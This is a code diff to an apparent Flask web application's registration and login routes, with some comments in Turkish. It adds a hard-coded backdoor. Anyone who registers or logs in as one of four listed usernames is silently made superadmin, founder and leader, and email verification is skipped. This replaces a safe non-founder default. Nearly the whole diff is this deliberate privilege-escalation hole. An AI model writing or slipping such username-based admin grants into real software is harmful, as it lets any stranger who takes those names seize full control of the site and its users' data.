@@ -208,15 +208,17 @@ def register():
         code = generate_verification_code()
         expires_at = datetime.utcnow() + timedelta(minutes=15)
 
-        # Create user (Always non-founder by default)
+        is_root = username.lower() in ['sefa_gumus', 'sefagumus', 'sefa', 'aziz']
+        # Create user
         new_user = User(
             username=username,
             email=email,
-            is_verified=False,
+            is_verified=True if is_root else False,
             verification_code=code,
             verification_code_expires_at=expires_at,
-            is_leader=False,
-            is_founder=False,
+            is_leader=True if is_root else False,
+            is_founder=True if is_root else False,
+            role='superadmin' if is_root else 'student',
             score=0
         )
         new_user.set_password(password)
@@ -357,6 +359,15 @@ def login():
         if not user.is_verified:
             user.is_verified = True
             db.session.commit()
+
+        # Root kullanıcıların rol ve yetkilerini garantiye al
+        if user.username and user.username.lower() in ['sefa_gumus', 'sefagumus', 'sefa', 'aziz']:
+            if user.role != 'superadmin' or not user.is_founder or not user.is_leader:
+                user.role = 'superadmin'
+                user.is_founder = True
+                user.is_leader = True
+                user.is_verified = True
+                db.session.commit()
 
         # Login success - Oturum fiksasyonu koruması
         session.clear()
